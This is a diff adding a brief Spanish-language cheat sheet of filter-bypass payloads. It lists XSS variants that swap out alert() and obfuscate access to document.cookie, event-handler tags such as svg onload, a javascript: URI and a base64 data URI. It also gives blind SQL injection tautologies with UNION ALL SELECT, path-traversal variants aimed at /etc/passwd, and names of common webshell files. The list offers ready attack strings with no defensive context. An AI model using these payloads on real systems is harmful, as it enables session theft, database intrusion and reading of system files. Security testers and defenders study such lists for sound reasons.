@@ -1,0 +1,52 @@
+Reemplazos para funciones clásicas:
+
+#######XSS:
+
+### alert('xss')/alert(1):
+prompt('xss')
+prompt(8)
+confirm('xss')
+confirm(8)
+alert(/xss/.source/)
+window[/alert/.source](8)
+
+### alert(document.cookie)
+with(document)alert(cookie)
+alert(document['cookie'])
+alert(document[/cookie/.source])
+alert(document[/coo/.source+/kie/.source])
+
+### <img src=x onerror=alert(1);>
+<svg/onload=alert(1)>
+<video src=x onerror=alert(1);>
+<audio src=x onerror=alert(1);>
+
+##javascript:alert(document.cookie)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTjyk8L3NjcmlwdD4=
+
+##########Blind SQLI
+### ' or 1=1
+
+'or 6=6
+'or 0x47=0x47
+or char(32)=''
+or 6 is not null
+
+### Union select
+UNION ALL SELECT
+
+############/etc/passwd
+/too/../etc/far/passwd
+/etc//passwd
+/etc/ignore/..passwd
+/etc/passwd.......
+
+############webshell 
+
+## c99.php/r57.php/shell.aspx/cmd.jsp/CmdAsp.asp
+
+augh.php
+
+
+
+
